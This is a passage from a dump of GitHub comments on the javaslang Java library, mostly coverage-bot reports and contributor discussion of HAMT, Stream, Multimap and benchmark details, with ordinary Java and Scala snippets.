Sounie:master into 982e8bdb0de2f6bdebc86c6079ff794856a8aa0f on javaslang:master.\n. \nCoverage remained the same at 99.8% when pulling b0fc15ee1e891d5bd56144217da267d7716b12a6 on martin-g:master into 65aff17b9199df09f683fe6bbc4fa6667b93b4ec on javaslang:master.\n. \nCoverage increased (+0.03%) to 99.74% when pulling aaca75f1ef105c2f4b3cf79314eec0e56bf8e199 on danieldietrich:master into 6735ae7e7076d0966b0be33bd0b2dd0b10509e4c on javaslang:master.\n. \nCoverage increased (+0.03%) to 99.74% when pulling b1d2b880a2b2b41996ba847b926d906f6cd8e0fa on danieldietrich:master into 6735ae7e7076d0966b0be33bd0b2dd0b10509e4c on javaslang:master.\n. \nCoverage increased (+0.1%) to 99.82% when pulling b1d2b880a2b2b41996ba847b926d906f6cd8e0fa on danieldietrich:master into 6735ae7e7076d0966b0be33bd0b2dd0b10509e4c on javaslang:master.\n. \nCoverage remained the same at 99.82% when pulling 46bd2e4bc900748e394e498812c3b980c141ee69 on b1nd:patch-1 into 21a649f53dfdfd30598ba10de63e509b437cd628 on javaslang:master.\n. \nCoverage remained the same at 99.82% when pulling e5303c47697422913cf409ab1c4561538257c558 on jorander:126_Euiler_1_and_2 into e729bf2291584b89794a2a9203f8199f85ba4226 on javaslang:master.\n. \nCoverage increased (+0.0%) to 98.22% when pulling 79971936334b80d356da193665aa7f43d44c51a1 on jorander:126_Euler_problems into e41091e05306743554491e39830df67be759e251 on javaslang:master.\n. \nCoverage increased (+0.0%) to 98.22% when pulling fd7da7ef6327be2c1e239ee4e36412490cc4dd0a on jorander:126_Euler_problems into e41091e05306743554491e39830df67be759e251 on javaslang:master.\n. \nCoverage increased (+0.04%) to 98.25% when pulling b687c851a5d1a77eea382dfd04994deeb09ee026 on jorander:126_Euler_problems into e41091e05306743554491e39830df67be759e251 on javaslang:master.\n. \nCoverage remained the same at 98.25% when pulling e6f1ae55a78f2e079aa5d4581b962c6218ec3c25 on gitter-badger:gitter-badge into 379c7eafe9a7df88b35d83168828f0e0aad418f7 on javaslang:master.\n. \nCoverage increased (+0.0%) to 98.25% when pulling 512d9eb8bb49dbca6c3c15cb99a84fda58fb4b14 on jorander:126_euler_no_3 into 219f5e3afb9b399e697a81759ea4646c60e0d800 on javaslang:master.\n. \nCoverage increased (+0.0%) to 98.25% when pulling 2dee7cc4484f358a1461669498e00021f61fe655 on jorander:126_euler_no_3 into 219f5e3afb9b399e697a81759ea4646c60e0d800 on javaslang:master.\n. \nCoverage increased (+0.0%) to 98.25% when pulling 4b39e56511efb2f1dad8d22fcab7774c85780a56 on jorander:126_euler_no_3 into 219f5e3afb9b399e697a81759ea4646c60e0d800 on javaslang:master.\n. \nCoverage remained the same at 97.24% when pulling 80261abd10b817583c1fc774dfd042b46234ce28 on ignasi35:master into c5af005e231d8e8b055cab42a423d5b8dd7a3a14 on javaslang:master.\n. \nCoverage remained the same at 97.24% when pulling fd25fb5348583f57fe77bf881227e5f599926945 on jorander:126_euler_problem_4 into 10858a18563e567c1efe242a0b0f2af0635318a5 on javaslang:master.\n. \nCoverage decreased (-0.04%) to 97.21% when pulling da67c87d51c5b05d9ba45dfc84a5e93e8fa81939 on jorander:126_euler_problem_4 into 10858a18563e567c1efe242a0b0f2af0635318a5 on javaslang:master.\n. ",
    "ignasi35": "Some more tips on the subject. http://stackoverflow.com/a/9054660\n. Hi @danieldietrich ,  \nI did a quick native2ascii and apart from comments there's a ' lambda-sign' that got escaped. Could that be it?\n```\n(excerpt)\n712c712\n<           public interface $className$fullGenerics extends \u03bb$additionalExtends {\n\n\n      public interface $className$fullGenerics extends \\u03bb<R>$additionalExtends {\n\n```\n\nSorry I can't test it on Win machine at the moment.\nCheers,\nPS: full diff:\n```\n511generator$ /Library/Java/JavaVirtualMachines/jdk1.8.0_40.jdk/Contents/Home/bin/native2ascii Generator.scala > out\n512generator$ diff Generator.scala out\n642c642\n<               // \u00ac(p => q) \u2261 \u00ac(\u00acp \u2228 q) \u2261 p \u2227 \u00acq\n\n\n          // \\u00ac(p => q) \\u2261 \\u00ac(\\u00acp \\u2228 q) \\u2261 p \\u2227 \\u00acq\n\n712c712\n<           public interface $className$fullGenerics extends \u03bb$additionalExtends {\n\n\n\n      public interface $className$fullGenerics extends \\u03bb<R>$additionalExtends {\n\n1197c1197\n<                 // (\u2200a,b \u2208 \u211d+ \u2203c \u2208 \u211d+ : a\u00b2+b\u00b2=c\u00b2) \u2261 (\u2200a,b \u2208 \u211d+ : \u221a(a\u00b2+b\u00b2) \u2208 \u211d+)\n\n\n\n            // (\\u2200a,b \\u2208 \\u211d+ \\u2203c \\u2208 \\u211d+ : a\\u00b2+b\\u00b2=c\\u00b2) \\u2261 (\\u2200a,b \\u2208 \\u211d+ : \\u221a(a\\u00b2+b\\u00b2) \\u2208 \\u211d+)\n\n1207c1207\n<                 // \u2200is,ss: length(is) = length(ss) \u2192 unzip(zip(is, ss)) = (is, ss)\n\n\n\n            // \\u2200is,ss: length(is) = length(ss) \\u2192 unzip(zip(is, ss)) = (is, ss)\n\n\n```\n. ",
    "ruslansennov": "@danieldietrich  please review this HAMT implementation ruslansennov/javaslang@b9fcfb185175b02be7ddc99e8641309f178f6942\nWhat other methods need to be implemented?\n. I also think that we should not implement all methods of Traversable.\n. OK, see #410 \n. This looks like a revolution. Please review my PR before :)\n. Trie.containsValue() is a very strange method. It can be implemented by naive search along whole trie or by storing values in additional structure. I believe it must be removed from interface\n. > Decision needed\nI agree with both ideas and will try to implement them\n. I believe we should use Array backed by T[] in ArrayNodes. Searching in RAL is too slow\n. well I'll make another PR without broken links from old issues\n. I'm not sure, but I think the realization of this algorithm in a functional style requires a lot of memory.\nBut with addSelf() method searching for prime numbers may become easier\nscala\nval primes: Stream[Int] = 2 #:: Stream.from(3, 2).filter(i => \n    primes.takeWhile(j => j * j <= i).forall(k => i % k > 0)\n)\nWe can make refactoring PrimeNumbers.java because I believe it's completely non-obvious\n. #370 done\n. just interesting project :)\n. I thought about something similar to Traversable.unit(), thank you\n. it's typical for me to forget <? extends T>\n. @danieldietrich I believe any Set is a special case of Map :)\n. wow... it was wrong subject :)\n. HashSet almost ready but I need some time\n. it seems to be OK\n. My maven locally build fails in 50% of cases.\nReplacement\n\n        third.await(200, TimeUnit.MILLISECONDS);\n\non\n\n        third.await(1000, TimeUnit.MILLISECONDS);\n\nfixes this bug in most cases, but it's bad solution\n. Have a nice trip! It's a good idea to leave the laptop at home\n. > Con: the public API shows more classes\nThis was the reason I chose abstract class instead of interface\nBut there is not problem, I believe it's just a matter of taste \n. I named builders Iterator.ofIterators() because of conflicts with other statics\n. Scala accept illegal index in splitAt()\n. As I know nobody promises that the return set of keys should be in certain order. We can do it as our feature, but I'm not sure. All another your proposals are very good.\n. just for clarify: HashMap.keySet() should be return Set and only Set. But sorted set or hash set, that is the question\n. I thought the idea to change javaslang.collection.List<Tuple2<K,V>> on java.util.TreeMap<K,V> in HashArrayMappedTrie.LeafNode...\nIt only makes sense if we have a lot of collisions as in case of HashArrayMappedTrieTest.WeakInteger (completely stupid hashCode algorithm). In all other cases java.util.TreeMap will require more memory but did not give us a big win in CPU\n. beautiful, I'll try to implement it in the evening\n. @danieldietrich @szarnekow pls review\n. @szarnekow @danieldietrich thank you\n. What algorithm you prefer to implement here? If something like java.util.ArrayList then we can use it in HashArrayMappedTrie. If no, then I'd like to remove HashArrayMappedTrie.ArrayNode because of high cost of List.set(index, element) operation\n. HashArrayMappedTrie.ArrayNode is useful only if cost of set() operation is O(1). We have O(n), so we can use HashArrayMappedTrie.IndexedNode only\n. ... with some modifications, of course :)\n. No, I mean that cost of List.set(index, element) is O(n). If HashArrayMappedTrie.ArrayNode backed by List, then there is no general difference between HashArrayMappedTrie.ArrayNode and HashArrayMappedTrie.IndexedNode, and they may be combined into NoLeafNode without loosing CPU or memory\n. Oh, I have not seen #295 before. Of course in this case we should keep ArrayNode\n. I'll name it WrappedString right now\n. @patrox It seems all ready, I'll finish soon\n. @danieldietrich There is problem to make test for String. I see no other way except make it independent from AbstractSeqTest\n. I like CharSeq\n. in other side WrappedString assumes big list of java.lang.String methods and it is good\n. done, thank you\n. @danieldietrich please reopen this issue. Now we have <90% tests coverage, this is not good\n. done\n. 4,663 lines in 2 classes! :)\n. I'll take a break :)\n. @patrox it's really a good idea\n. :+1: \n. Yes. Travis builds JavaSlang by few steps and converts these 90+ seconds to minutes\n. yep\n. Sieve may be created not as boolean map which say you about the number's status, but as integer map, which say you one of divisor. This trick helps to find all divisors very easy\n. hmmm... answer is 76576500, to big for sieve.\nSorry, this trick can't help you :)\n. before\nRunning javaslang.collection.euler.Euler10Test\nTests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 97.8 sec\nafter\nRunning javaslang.collection.euler.Euler10Test\nTests run: 1, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 1.461 sec\n. It's simple: lazy collection == lazy length\n. :+1: \n. O_o\n. But\nscala\nscala> List(1, 2, 3, 4, 5).sliding(2, 4).toList\nres0: List[List[Int]] = List(List(1, 2), List(5))\nThis should be investigated...\nBTW, we HAVE a bug!\nThis code is completely wrong.\njava\n        while (!list.isEmpty()) {\n            final Tuple2<List<T>, List<T>> split = list.splitAt(size);\n            result = result.prepend(split._1);\n            list = split._2.isEmpty() ? Nil.instance() : list.drop(step);\n        }\nShould be something like this\njava\n        while (list.length() >= size) {\n            result = result.prepend(list.take(size));\n            list = list.drop(step);\n        }\nor like this\njava\n        while (list.length() >= size) {\n            result = result.prepend(list.take(size));\n            list = list.length() <= step ? empty() : list.drop(step);\n        }\n. It was an obsession, sorry :)\n. btw, List.dropRight() now is faster: only one reverse operation\n. > It is only memoized, right?\nexactly :smile: \nand with ConcurrentHashMap in Memoized implementation this trick doesn't work :cry: \n. OK, today evening\n. There is no significant difference on travis (-10%), but runs 2 times faster on my computer.\n. I don't know... I tested it with data size = 100k instead of 5k on travis...\n. mmm... List.Cons has a SerializationProxy, but Queue is not\n. +20% to Value tests coverage :)\n. > Our goal comes closer...\nWe need to implement most of HashMap methods.\n@patrox I will do this if you don't have enough time\n. nat\u00fcrlich\n. Something wrong in this PR...\nI should implement all override methods in all classes\n. Now it looks better\n. No events from travis up to now (15 minutes). I believe it must be started manually\n. +1% :)\n. > 12 kids(!) where there\nlocal hell :)\n. Our goal is to make equals() behavior exactly as in Scala, right?\n. > I will change Iterator.equals most probably to work like ==. This will be documented in the interface.\nvery well\n. Your solution doesn't work if sequences have different lengths... am I right?\n. I'm out of my computer now, I'll rename it tomorrow \n. Very simple commit but produced lot of comments :)\n. No, we should decrease all indexes in tree\n. wow! I haven't any idea, it should be investigated\n. @danieldietrich no! All HAMT operations costs O(1). But some Vector operations costs O(n)\n. > return new Vector<>(tree.remove(key)); // O(1) and tree indices are aligned new, right?\nNo :)\nLet's imagine Vector(a, b, c). It's corresponds to Trie(0 -> a, 1 -> b, 2 -> c)\nAfter removing first element we will have  Trie(1 -> b, 2 -> c)\nBut it is not correct trie object, because first element has index=1 but not 0\n. > But still the question how Scala does the trick :-)\nYes!\n. I believe all is OK for HAMT and this issue can be closed\n. I see there are big changes in project :)\n. > you may implement more methods\nOK, I'II implement this\n. Ok, just close this\n. @danieldietrich no problem, all Sunday I was like a sleepy kitty and didn't do anything :)\n. Inserting 1000000 elements...\nJava HashMap test took 0.106 sec.\nHashMap test took 22.126 sec.\nJava TreeSet test took 0.204 sec.\nTreeSet test took 0.773 sec.\nHashSet test took 21.423 sec.\nI believe problems are memory allocation and GC\nIt's so sad\n. Replacing\nprivate final Array<AbstractNode<K, V>> subNodes;\nby\nprivate final Object[] subnodes\nin HAMT will solve most of problems\n. ok\n. No, it was bad idea. It will be mutable object.\nWe need for another trick\n. Java HashMap bench took 0.121 sec.\nJava TreeSet bench took 0.24 sec.\nJavaslang HashMap bench took 2.811 sec.\nJavaslang TreeSet bench took 0.829 sec.\n10x faster on my computer (was about 20 sec)\n. I don't understand this, sorry, can you explain? HashArrayMappedTrie's length() can be O(1), like List, Vector and any other not lazy collection\n. > It can be - at the cost of computing the size at construction time, e.g. via subNodes.map(AbstractNode::size).sum().intValue(). But my performance measures showed, that this costs too much time.\nNo. We can store size in every AbstractNode and update it with every changing. It can't be O(n). For example if AbstractNode was added, then total new size = old size + size of added AbstractNode and so on\n\nOr did you mean Stream?\n\nStream is a lazy collection. Its length() can be O(n), OK\n. > subNodes.map(AbstractNode::size).sum().intValue()\nit was very bad idea, but it can be improved! :)\n\nWill you do it?\n\nOf course\n. what happened with travis?\n. :metal: \n. new StreamEmpty() vs new StreamModule.Empty()?\nI vote for StreamEmpty :)\n. > we allow null keys, aren't we?\nin HasMap keys should have hash code\nin TreeMap keys should be comparable :)\n. do you mean that the user has to choose the right generic type if he uses this method?\n. but Tuple hasn't right comparator or right hash code calculator\n. Sorry, Tuple's hash code is fine.\nOK, HashMap has now only one TODO, this strange method (for me).\n. I don't know why, but now all is OK.\nSorry, this can be closed\n. #428 \n. I believe 13.10.2015 may be very optimistic :) We should implement TreeMap and tons of tests. And I will busy this (and maybe next) week too...\n. Ok, what if we will make two tabulate methods, which will have different signatures for seq and maps?\nBTW, cast to T[] here\njava\n@SuppressWarnings(\"unchecked\")\npublic static <T> Array<T> of(T element) {\n    return wrap((T[]) new Object[] { element });\n}\nis not necessary. This is ancient cast, when Array::wrap() took T[] only. See #994\n. http://uncyclopedia.wikia.com/wiki/AAAAAAAAA!\n. > Maybe it is sufficient not to abstract over this special case and just let Tuple implement the interfaces Convertable, Printable, etc.\nfine :)\n. \n. done\n. :+1:\n. btw benchmark.collection.MapSetBench is wrong.\nYou can try to modify main(String[] args) on something like this\njava\n    public static void main(String[] args) {\n        benchHashSet_put();\n        benchHashSet_put();\n        benchHashSet_put();\n        ...\nand output will be\nJava HashMap.put bench(1000000) took 0.05 sec.\nHashMap.put bench(1000000) took 5.98 sec.\nJava HashMap.put bench(1000000) took 0.041 sec.\nHashMap.put bench(1000000) took 3.293 sec.\nJava HashMap.put bench(1000000) took 0.081 sec.\nHashMap.put bench(1000000) took 3.15 sec.\nJava TreeSet.add bench(1000000) took 0.317 sec.\n. Yes javaslang-jackson already has such helper, but I did not take into account the unsafe behavior when it used in global scope. Seems it cannot be both safe and useful.\nOK, you're right, this method is unnecessary.\n. 94% -> 88% (!) :smile: \n. Perfect is the enemy of good\n. hmm... +20% on travis :smile:\n. OK, travis shows different results, and can't be arbiter. Anyway I believe shouldCallMinFunctionOncePerElement() is not bad idea :smile: \n. gogogo\n. \u043d\u0435 \u0437\u0430 \u0447\u0442\u043e :)\n. > Is there a reason for that? \nNo :smile: \n. I believe endsWith() should accept java pure collections. To know size of Iterable you can convert it to any Seq\n. #612 \n. > I have a solution in mind\nIt works. Here is my prototype\n``` java\nfinal class Append implements Stream {\n@Test\npublic void kekeke() {\n    System.out.println(\n            Stream.range(0, 1_000_000)\n                    .map(String::valueOf)\n                    .foldLeft(Stream.empty(), Stream::append)\n                    .mkString()\n                    .length()      //  5888890\n    );\n}\n\nT head;\nQueue<T> queue;\nLazy<Stream<T>> tail;\n\nAppend(T head, Queue<T> queue, Lazy<Stream<T>> tail) {\n    this.head = head;\n    this.queue = queue;\n    this.tail = tail;\n}\n\n@Override\npublic T head() {\n    return head;\n}\n\n@Override\npublic boolean isEmpty() {\n    return false;\n}\n\n@Override\npublic Stream<T> append(T element) {\n    return new Append<>(head, queue.append(element), tail);\n}\n\n@Override\npublic Stream<T> tail() {\n    Stream<T> t = tail.get();\n    if(t.isEmpty()) {\n        return Stream.ofAll(queue);\n    } else {\n        if(t instanceof Cons) {\n            Cons<T> c = (Cons<T>) t;\n            return new Append<>(t.head(), queue, c.tail);\n        } else {\n            Append<T> a = (Append<T>) t;\n            return new Append<>(t.head(), queue, a.tail);\n        }\n    }\n}\n\n}\n```\nI believe we should do these steps:\n- move Empty, Cons and SerializationProxyto module\n- make Cons abstract and rename it to NonEmpty\n- implement Cons and Append as NonEmpty\n- also do it for appendAll() and maybe for map() etc (???)\n. > Slow down\nI still didn't do anything :smile: \n\nMaybe Cons can't be final then and Append extends Cons.\n\nCons should be final if we want to be sure of the correct serialization. This should be discussed\n\nI also question if Stream should implement a more memory consuming append at all. Is Stream, which is like a memoizing Iterator, really the right collection to append millions of elements? A Stream maybe has a different purpose.\n\nIt is not critical increase in memory. One Append instance for whole millions append operations. The only problem is more complex implementation for non-standard (yes, I agree) stream's behavior. \n\nWhy does append work for Scala on constant stack?\n\nJust magic :disappointed: \n. Ok, here we use potentialy millions Stream.append() :smile: \n. This shows that Iterator.ofAll(...) coverage not changed... very strange\n. same question...\n. but don't rush :smile: \n. It seems we should remove all lazy hash codes from sequences, but keep these in certain cases like in HAMT.ArrayNode (it significantly reduces performance)\n. Now we have lazy hash code here:\n- Queue In case of non-empty rear list it reduces performance. We can add hashCode to constructor, but this makes code more (and more) difficult\n- HAMT.ArrayNode Each node changing made by System.arrayCopy() which is fast. But additional loop for hashCode calculation significantly reduces performance.\n- HashMap, HashSet, Vector because of HAMT\n- Stream must be lazy\n- Array same problem like in HAMT.ArrayNode\nIn all these cases (except HAMT.ArrayNode) we have exactly one instance of Lazy, so it is not problem. For example, List produces a lot of lazy objects and it was bad.\nIn case HAMT.ArrayNode it is not problem because number of this kind of node in trie is small (something about 3%)\nI believe this issue can be closed\n. I use standard Oracle profiler Java VisualVM. Fortunately objects belonging to Vector are immediately visible in the list, because a lot of them.\nBefore my last two commits:\n\n... and after\n\nIt's clear that before optimizations total size of all Vector's object is about 200MB (like @netzwerg says), and after is about 115 MB :smile: \n. I'm afraid this change tragically decrease performance in some certain cases\n. \n. Maybe we should implement it only for arity() >= 2 ?\n. yep\n. \n. :+1: \n. [INFO] BUILD SUCCESS\n[INFO] ------------------------------------------------------------------------\n[INFO] Total time: 01:32 min\n[INFO] Finished at: 2015-12-01T04:34:17+00:00\n[INFO] Final Memory: 27M/213M\n[INFO] ------------------------------------------------------------------------\nbut something wrong with artifacts downloadings\n. I believe {lazy collection}.groupBy() should be greedy.\nTo make it lazy we must implement immutable Map<K, Traversable<T>> with get() method like this:\njava\nOption<Traversable<T>> get(K key) {\n    return Option.of(source.filter(s -> classifier.apply(s).equals(key));\n}\nBut some other methods (like entrySet()) doesn't make sense\n. sure\n. challenge accepted\n. It's impossible to create these methods together because of \"both methods have same erasure\"\njava\npublic static <K, V> HashMap<K, V> ofEntries(Iterable<? extends Tuple2<? extends K, ? extends V>> entries)\npublic static <K, V> HashMap<K, V> ofEntries(Iterable<? extends java.util.Map.Entry<? extends K, ? extends V>> entries)\nMy proposal is: we should keep our methods as is\njava\npublic static <K, V> HashMap<K, V> ofAll(Tuple2<? extends K, ? extends V>... entries) {\npublic static <K, V> HashMap<K, V> ofAll(Iterable<? extends Tuple2<? extends K, ? extends V>> entries)\nand additionally provide\njava\npublic static <K, V> HashMap<K, V> ofEntries(java.util.Map.Entry<? extends K, ? extends V>... entries) {\npublic static <K, V> HashMap<K, V> ofEntries(Iterable<? extends java.util.Map.Entry<? extends K, ? extends V>> entries)\n. OK\n. you can assign me to any task :)\n. \n. > Are there other types that have inner classes we don't want to expose?\nIMO all implementations of these interfaces should be hidden:\n- List\n- Stream\n- Option (in case if Option.of(null) will return Some(null))\n- Lazy (already hidden)\n\nDoes javaslang-jackson currently use them?\n\nOf course no! :)\n. Fixed by ff434724c11329d5e16e19eb7dbaf4aa90d5c5b7\n. Could you add tests?\n. I would add to AbstractValueTest\n. Merry Christmas :smile: \n. It may be more realistic to do Javaslang port to Kotlin\n. > When necessary, specific features are excluded from the Android version of Javaslang\nAnyway it is not enough. \nAndroid Dalvik format accept only 65k methods in one *.dex file.\nThere is solution in modern versions of Android, but this is followed by a lot of troubles\nIn case of Javaslang it is big problem.\n. > Output of du -ah . | grep -v \"/$\" | sort -r in target/classes/javaslang:\n\n68K    ./collection/List.class\n\nNo :smile: \nNot size of *.class file, but number of methods\nit's not so tragic like size, but we have problems with this\n. I have played with Javaslang as applied to GWT 2.8 (which accept Java8) and my first attempt was unsuccessful :imp: To support GWT we should rewrite \u03bb (your favorite class), solve a lot of problems with serializations and so on...\n. we will see :)\n. Hi @bruce264 \nNo, of course I think Javaslang have less than 65k methods. But a lot. This need to be investigated.\nFor example, Foldable::map overridden in each of his implemented classes (including all interfaces like Value, Seq, List etc). All of them give us +1 to total methods counter. I and my colleagues can't use multidexing in our App and can't use guava and others very big (and awesome) libraries.\nSome developers that can't use multidexing maybe will be frustrated of Javaslang's port to Android because of these reasons\n. could you calculate number of methods in apk?. Yo! #1000 :smile: \n. Sorry, I forgot\n. What about something like this?\n``` java\nprivate final Node parent;\npublic Node(T value, List> children, Node parent) {\n    //...\n    this.children = children.peek(child -> child.setParent(this));\n    this.parent = parent;\n    //...\n}\npublic Node setParent(Node parent) {\n    return new Node<>(this.value, this.children, parent);\n}\n```\n. > Too much for one PR I think O_o\nyep, very bad PR :)\n. > This probably is the reason for the decreased code coverage.\nProbably?! Realy?! :)\n. > Did you profile it?\nYes :)\nIt was surprise for me that caching Objects.hashCode(...) can significantly increase performance. Also I removed List from IndexedNode because of very slow List.get() method.\n. what about other collections?\n. Stream.ofAll(javaslang.Iterator) is ambiguous because it implements both java.util.Iterator and java.lang.Iterable\n. My opinion it is unnecessary method :)\n. I don't know :) I'll keep this branch undeleted\n. No, this makes no sense. We should to implement reactive lazy Stream...\n. No, parallel() produces sequence in the order in which they were completed.\n. > parallel() would make only sense, if single results are accessible before all futures complete\nyes\n. I'd like to see Multimap and Multiset in Javaslang :stuck_out_tongue_winking_eye: \n. \n. So sad, it was part of jackson encode/decode... \n. I had to give this link\n. > Ok, extending Serializable should be sufficient, right?\nYes, should be\nThank you\n. trust me\n. > interface MultiMap<K, V, TYPE extends Traversable<V>>\nYes, I thought about it.\nOK, let's make the big Zoo of Multimap's implementations :)\n. partly blocked by #1132 \n. | Backed by | Container | Multimap |\n| --- | --- | --- |\n| HashMap | HashSet | HashMultimapSet |\n| HashMap | List | HashMultimapSeq |\n| LinkedHashMap | LinkedHashSet | LinkedMultimapSet |\n| LinkedHashMap | List | LinkedMultimapSeq |\n| TreeMap | HashSet | TreeMultimapSet |\n| TreeMap | List | TreeMultimapSeq |\nMultimapSeq can store duplicate key-value pairs unlike MultimapSet\n. > I think the Seq/Set return type problem could be solved if we make use of Kind1<..., ...> for the container type... but I have to see where it clashes.\nI will check it\n\nTreeMultimap.empty(SEQ); // List is chosen\nTreeMultimap.empty(SET); // TreeSet is chosen\n\nYes, looks good :+1: \nP.S. I saw your comment about deadline at 15.03.2016 and I believe Multimap will be ready\n. > they are under 'heavy' development\nMultimap mostly done... \n. @patrox just click on codecov badge\n. > Multimap mostly done...\nhaha...\n\nWhy can't we have just HashMultimap, LinkedMultimap and TreeMultimap?\n\nI have no idea how this can be implemented :disappointed: \nFor example, Multimap.get(key) can't return Traversable<V> because it is unsafe. And we can't use Kind1<T, V> as return type because it not works in Multimap.flatMap(BiFunction)\nCurrent state you can see in my branch 'multimap'\n. > Do we return an empty collection instead of an empty Option if the key is not present?\nempty Option\n\nI would remove the MutlimapImpl.Factory interface to save the factory instance variable (also removed). The methods of the Factory interface can be protected abstract in MultimapImpl and be overridden by subclasses.\n\nOf course, it is just stub...\n. > Is it not good to return Option with T extends Traversable?\nIt is good! And it works fine everywhere except Multimap.flatMap()/biMap()/etc because it must return T2 extends Traversable<V2>. And must be same type of Traversable, like T. \nI tried to use Kind1, but it doesn't work\n. \n. Now Multimap has only 2 generics and it is good (branch updated)\n. Fine, let's move it to 2.x.x\n. AstractTraversable follows\n. yes, all possible needed changes in Traversable we can make separately later\n. I'm using master. Maybe problem is too old version of Intellij Idea.\nFortunately I use Windows not every day, I will check this later\n. I'm sure that this bug refers to the old IntelliJ Idea, but I have to check this out. I have not forgotten about it, just do not have the possibility to check it out. Give me few days :)\n. No, this is feature (bug?) of JDK installed on my Windows \n``` java\n// fine\nprivate Validation validateTestCompiled(Option opt) {\n    final Function, Validation> f = o -> o.isEmpty() ?\n            Validation.valid(\"valid\")\n            : Validation.invalid(\"invalid\");\n    return opt.transform(f);\n}\n// compilation error\n// [ERROR] /C:/Users/rsennov/javaslang/javaslang/src/test/java/javaslang/control/ValidationTest.java:[565,33] \n// incompatible types: inferred type does not conform to upper bound(s)\n// inferred: javaslang.control.Validation<? extends java.lang.Object,? extends java.lang.Object>\n// upper bound(s): javaslang.control.Validation,java.lang.Object\nprivate Validation validateTestNotCompiled(Option opt) {\n    return opt.transform(o -> o.isEmpty() ?\n            Validation.valid(\"valid\")\n            : Validation.invalid(\"invalid\"));\n}\n```\n. This code also fails\njava\n// [ERROR] /C:/Users/rsennov/javaslang/javaslang/src/test/java/javaslang/control/ValidationTest.java:[19,29] \n// incompatible types: inferred type does not conform to upper bound(s)\n// inferred: javaslang.collection.HashMap<? extends java.lang.Object,? extends java.lang.Object>\n// upper bound(s): javaslang.collection.Map<java.lang.String,java.lang.String>,java.lang.Object\nprivate Map<String, String> mapTest(Option<Void> opt) {\n    return opt.transform(o -> o.isEmpty()? HashMap.empty() : HashMap.of(\"1\", \"2\"));\n}\n. For clarification, of course I do mvn clean test, this is not problem of IntelliJ Idea.\n. I had same problem. Solved with two steps: maven build and then syncing Idea\n. The problem located in exactly one test method\nCompiles fine\njava\n@Test\npublic void shouldFoldMultipleElements() {\n    assertThat(Monoid.fold(Monoid.<Integer>of(0, (a, b) -> a + b), List.of(1, 2, 3))).isEqualTo(6);\n}\nCompilation fails\njava\n@Test\npublic void shouldFoldMultipleElements() {\n    assertThat(Monoid.fold(Monoid.of(0, (a, b) -> a + b), List.of(1, 2, 3))).isEqualTo(6);\n}\n. I'll prepare patch in few minutes\n. \n. I don't believe\n. OK\nThen I can completely remove Stack from jackson\n. What do you think will be enough to give a link to this PR? :)\n. IDEA-153421\n. > Do you think this could work?\nI believe this couldn't work :(\n``` java\ninterface T {\n}\nclass C1 implements T, Comparable {\n@Override\npublic int compareTo(C1 o) {\n    return 0;\n}\n\n}\nclass C2 implements T, Comparable {\n@Override\npublic int compareTo(C2 o) {\n    return 0;\n}\n\n}\n```\nInstances of T can be comparable, not comparable or comparable with different types\n. Sorry, but isAssignableFrom is GWT-incompatible...\n. FYI I have working prototype of gwt-module for Javaslang. I believe it will be merged in master branch sometime in the future. Reflection is one of problem that cannot be resolved.\n. No :)\nHere in LeafSingleton.modify() keyHashCode always equals this.hash\n. But I'll check this once more this evening, maybe I'm wrong.\n. Hi\nwe are waiting for our leader :)\n. my vote for a new method splitSeq\n. Hi Grzegorz \nYou should edit Generator but not src-gen/* classes\n. Sorry, I was not accurate in my comment :)\nYou should \n1. manually change only Generator\n2. run mvn test (then all src-gen/ files will be changed automatically)\n3. all changes push to GitHub\n. Yes!\n. > What's the point of keeping track of the generator and stuff it generates during compilation?\nBoth points of view (include/exclude generated files) makes sense. I prefer exclude it from my projects,  It seems Daniel has another opinion :smile: \n. Thank you\nNow we are waiting for Daniel\n. #1617 \n. @danieldietrich @paplorinc please take a look on this skeleton: b63602eeec6d4f70853b5e8691425cd6b78876c1 (copied from Scala implementation)\n. #1334 \n. Hi guys.\nI believe it is impossible and, yes, the conflicts cannot be solved. I spent some time to make this but it was unsuccessful attempt. @paplorinc if you have any proposals, please show this, because it is very interesting\n. > Is there any reason why we used head() instead of first()?\nwe try to be as close as possible to Scala API\n. also String.format is gwt-incompatible\n. Your javaslang code not consistent with your Scala code.\nIt should be something like this:\n``` java\npublic class It {\nprivate static <T> void printTwice(Iterable<T> it) {\n    it.iterator().forEachRemaining(System.out::println);\n    it.iterator().forEachRemaining(System.out::println);\n}\n\npublic static void main(String[] args) {\n    printTwice(Vector.of(\"foo\"));   // print twice, ok\n    printTwice(Iterator.of(\"bar\")); // print once, ok\n}\n\n}\n```\nI believe it is impossible to return a new iterator in Iterator#iterator() method because Iterator is mutable object.\n. > I think all of them can simply return a new TreeSet\nI don't like this idea.\nI believe we should return the same type of Set like origin.\nIn case if someone want to have TreeSet he can do TreeSet.ofAll(...)\n. > providing a sorted method, like in List\nwhy not :smile: \n. Sorry, I thought for a moment\nThis method make sense only for LinkedHashSet.\n- BitSet and TreeSet already sorted\n- HashSet stored elements in own ordering not depended from insert ordering\nI would close this issue\n. First of all we can move all tests to another package\n. I'm not sure that this is necessary, because a lot of methods are not implemented in PQ\n. Hi guys, thanks for comments, I need one or two days to answer/reject/fix them :smile: \n. > In order to increase confidence in all those state changes, could we add a property based test that validates it against Java's BitSet after each step?\nYes, I'll do it in separate PR. Also benchmarks and Performance table\n. LGTM :smile: \n. ``` java\nstatic  Stream fromJavaStream(java.util.stream.Stream<? extends T> javaStream) {\n    return StreamFactory.create(new AbstractIterator() {\n    private final java.util.Iterator<? extends T> iterator = javaStream.iterator();\n\n    @Override\n    protected T getNext() {\n        return iterator.next();\n    }\n\n    @Override\n    public boolean hasNext() {\n        return iterator.hasNext();\n    }\n});\n\n}\n```\n. Oh, I was careless and thought the javaslang.Iterator is an argument. Then your second proposal is the best :)\n. Yes, it seems so. No :smile: \nI've checked this, issue may be closed. It seems that Daniel's phrase about \"the PRs need to be as small as possible\" is very actual :smile: \n. > I'm sure that the benchmarks will be very interesting for the whole Java and Scala community!\n:+1: \n. done\n. > I think this may have to do with waffle.io and the new story board. Not sure. I did not added 'in progress' explicitly.\nOh! :)\n. I'm playing with GWT now. There are problems with match mechanism (isAssignable method). I'll make resume soon.\n. > Wow, Scala's Iterate is fast. How is that difference?\nBut javaslang is faster (high score is good performance)!\n\nThe label 'in progress' does mean, that a PR should not be merged, yet?\n\nThis label automatically added by github. I don't know what is means :)\n. > > This label automatically added by github. I don't know what is means :)\n\nOh-kay. Seems to be a new feature!?\n\nI don't like it :)\n. I'm 